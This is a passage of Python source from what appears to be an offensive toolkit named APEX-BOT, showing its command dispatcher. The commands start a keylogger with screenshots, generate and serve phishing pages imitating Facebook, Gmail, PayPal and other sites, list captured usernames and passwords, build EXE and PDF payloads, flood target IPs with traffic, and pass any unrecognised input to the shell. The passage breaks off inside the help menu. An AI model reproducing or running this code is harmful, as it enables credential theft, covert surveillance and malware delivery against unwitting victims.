            self.running = True
            print(f"{Colors.PURPLE}✅ Web dashboard running at http://{host}:{port}{Colors.RESET}")

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None, nikto: NiktoScanner = None,
                 scanner: AdvancedNetworkScanner = None, ip_monitor: IPMonitor = None,
                 keylogger: AdvancedKeylogger = None, payload_gen: PayloadGenerator = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.nikto = nikto
        self.scanner = scanner
        self.ip_monitor = ip_monitor
        self.keylogger = keylogger
        self.payload_gen = payload_gen
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        return {
            # Keylogger Commands
            'start_keylogger': self._start_keylogger,
            'stop_keylogger': self._stop_keylogger,
            'keylogger_status': self._keylogger_status,
            'show_keylogs': self._show_keylogs,
            'show_screenshots': self._show_screenshots,
            
            # IP Monitor Commands
            'show_all_monitored_ip': self._show_all_monitored_ip,
            'scan_all_ip': self._scan_all_ip,
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # Traffic Generation
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # Nikto Commands
            'nikto': self._nikto,
            'nikto_full': self._nikto_full,
            'nikto_ssl': self._nikto_ssl,
            
            # Social Engineering
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_github': lambda _: self._phish('github'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            
            # Payload Commands
            'payload_gen': self._payload_gen,
            'payload_list': self._payload_list,
            'payload_exe': self._payload_exe,
            'payload_pdf': self._payload_pdf,
            
            # Network Commands
            'ping': self._ping,
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'curl': self._curl,
            'netcat': self._netcat,
            'traceroute': self._traceroute,
            'whois': self._whois,
            'dns': self._dns,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            'comprehensive_scan': self._comprehensive_scan,
            
            # System Commands
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            
            # Help
            'help': self._help,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Keylogger Commands ====================
    def _start_keylogger(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start_keylogger():
            return {'success': True, 'output': 'Keylogger started. Press F10 to stop.'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _stop_keylogger(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop_keylogger()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        info = self.keylogger.get_session_info()
        status = 'Running' if info['running'] else 'Stopped'
        return {'success': True, 'output': f"Keylogger Status: {status}\nSession: {info['session_id']}\nHost: {info['hostname']}\nKeylogs: {info['keylog_count']}\nScreenshots: {info['screenshot_count']}"}
    
    def _show_keylogs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"📝 Keylogs ({len(logs)}):\n"
        for log in logs:
            output += f"  [{log['timestamp'][:19]}] {log['text'][:100]}\n"
        return {'success': True, 'output': output}
    
    def _show_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = f"📸 Screenshots ({len(screenshots)}):\n"
        for s in screenshots:
            output += f"  • {os.path.basename(s)}\n"
        return {'success': True, 'output': output}
    
    # ==================== IP Monitor Commands ====================
    def _show_all_monitored_ip(self, args: List[str]) -> Dict:
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': 'No IPs being monitored'}
        output = f"🛡️ All Monitored IPs ({len(ips)}):\n"
        for ip in ips:
            status = '🔴 Blocked' if ip['is_blocked'] else '🟢 Active'
            threat = ip.get('threat_level', 'low').upper()
            ports = json.loads(ip.get('open_ports', '[]'))
            output += f"  {ip['ip_address']} - {status} (Threat: {threat}, Ports: {len(ports)})\n"
        return {'success': True, 'output': output}
    
    def _scan_all_ip(self, args: List[str]) -> Dict:
        ips = self.db.get_managed_ips()
        if not ips:
            return {'success': True, 'output': 'No IPs to scan'}
        
        count = 0
        for ip_data in ips:
            try:
                self.ip_monitor.scan_ip_now(ip_data['ip_address'])
                count += 1
            except Exception as e:
                logger.error(f"Scan error for {ip_data['ip_address']}: {e}")
        
        return {'success': True, 'output': f"Scanned {count} IPs"}
    
    # ==================== Existing Ping/Network Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.tools.nmap(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        domain = args[0]
        result = self.tools.whois(domain)
        return {'success': result.success, 'output': result.output}
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        domain = args[0]
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(domain, record_type)
        return {'success': result.success, 'output': result.output}
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        ip = args[0]
        result = self.tools.location(ip)
        if result.get('success'):
            output = f"📍 Location for {ip}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {ip}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _comprehensive_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: comprehensive_scan <target>'}
        target = args[0]
        results = self.scanner.comprehensive_scan(target)
        output = f"🔬 Comprehensive Scan Results for {target}\n"
        output += "=" * 50 + "\n\n"
        
        ping = results.get('ping', {})
        output += "📡 Ping Results:\n"
        output += ping.get('output', 'No ping data') + "\n\n"
        
        ports = results.get('ports', {})
        output += "🔌 Port Scan Results:\n"
        output += ports.get('output', 'No port scan data')[:500] + "\n\n"
        
        os_info = results.get('os', {})
        output += "💻 OS Detection:\n"
        output += os_info.get('output', 'No OS data')[:200] + "\n\n"
        
        services = results.get('services', {})
        output += "🔧 Service Detection:\n"
        output += services.get('output', 'No service data')[:200]
        
        return {'success': True, 'output': output}
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== Nikto Commands ====================
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_full(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '123456789', 'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_ssl(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # ==================== Social Engineering ====================
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(link_id, port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {link_id}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Payload Commands ====================
    def _payload_gen(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_gen <type> <name>\nTypes: exe, pdf'}
        payload_type = args[0]
        name = args[1]
        
        if payload_type == 'exe':
            payload = self.payload_gen.generate_exe(name)
        elif payload_type == 'pdf':
            payload = self.payload_gen.generate_pdf(name)
        else:
            return {'success': False, 'output': f'Unknown payload type: {payload_type}'}
        
        return {'success': True, 'output': f"Payload generated: {payload.id} ({payload.payload_type}) at {payload.file_path}"}
    
    def _payload_list(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        payload_type = args[0] if args else None
        payloads = self.payload_gen.list_payloads(payload_type)
        if payloads:
            output = "Payloads:\n"
            for p in payloads:
                output += f"  • {p['id']} - {p['name']} ({p['payload_type']}) - {p['deployment_count']} deployments\n"
            return {'success': True, 'output': output}
        return {'success': True, 'output': 'No payloads found'}
    
    def _payload_exe(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_exe(name)
        return {'success': True, 'output': f"EXE payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_pdf(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_pdf(name)
        return {'success': True, 'output': f"PDF payload generated: {payload.id} at {payload.file_path}"}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        try:
            ipaddress.ip_address(ip)
            if self.ip_monitor.add_ip(ip, notes):
                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
            return {'success': False, 'output': f'Failed to add IP {ip}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        ip = args[0]
        if self.ip_monitor.remove_ip(ip):
            return {'success': True, 'output': f'✅ IP {ip} removed from monitoring'}
        return {'success': False, 'output': f'IP {ip} not found'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(ip)
        db_success = self.db.block_ip(ip, reason, 'cli')
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {ip}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        ip = args[0]
        firewall_success = self.tools.unblock_ip(ip)
        db_success = self.db.unblock_ip(ip)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            threat = ip.get('threat_level', 'low').upper()
            output += f"  {status} {ip['ip_address']} - Threat: {threat}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            info = self.ip_monitor.get_ip_info(ip)
            if info:
                output = f"🔍 IP Information: {ip}\n"
                output += "=" * 40 + "\n"
                output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
                output += f"  OS: {info.get('os_info', 'Unknown')}\n"
                output += f"  Threat Level: {info.get('threat_level', 'low').upper()}\n"
                output += f"  Blocked: {'Yes' if info['is_blocked'] else 'No'}\n"
                ports = json.loads(info.get('open_ports', '[]'))
                output += f"  Open Ports: {ports}\n"
                return {'success': True, 'output': output}
            return {'success': False, 'output': f'IP {ip} not found'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {ip}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        info = self.ip_monitor.get_ip_info(ip)
        
        output = f"🦅 APEX-BOT IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        output += "📡 Ping Results:\n"
        output += ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n"
        output += nmap_result.output[:1000] + "\n\n"
        
        if info:
            output += "🛡️ Monitoring Status:\n"
            output += f"  Threat Level: {info.get('threat_level', 'low').upper()}\n"
            output += f"  Blocked: {'Yes' if info['is_blocked'] else 'No'}\n"
            if info.get('hostname'):
                output += f"  Hostname: {info['hostname']}\n"
            if info.get('os_info'):
                output += f"  OS: {info['os_info']}\n"
        
        output += "\n💡 Recommendations:\n"
        if ping_result.success and ping_result.output:
            output += "  • Target is reachable\n"
        else:
            output += "  • Target may be down or blocking ICMP\n"
        if 'open' in nmap_result.output:
            output += "  • Open ports detected - review security\n"
        
        return {'success': True, 'output': output}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🦅 APEX-BOT System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylogs: {stats.get('total_keylogs', 0)}
  Payloads: {stats.get('total_payloads', 0)}
  Agents: {stats.get('total_agents', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        threats = self.db.get_recent_threats(10)
        
        report = f"""
🦅 APEX-BOT Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylogs: {stats.get('total_keylogs', 0)}

🚨 Recent Threats:
"""
        for t in threats[:5]:
            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BLUE}         APEX-BOT v5.0.0 - HELP MENU                                       {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE}                                                                           {Colors.PURPLE}║
║{Colors.BLUE}⌨️ KEYLOGGER COMMANDS:{Colors.RESET}
║  start_keylogger               - Start keylogger (F10 to stop)
║  stop_keylogger                - Stop keylogger
║  keylogger_status              - Show keylogger status
║  show_keylogs [limit]          - View captured keylogs
║  show_screenshots              - View captured screenshots
║
║{Colors.BLUE}🛡️ IP MONITOR COMMANDS:{Colors.RESET}
║  show_all_monitored_ip         - Show all monitored IPs
║  scan_all_ip                   - Scan all monitored IPs
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.BLUE}🔌 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
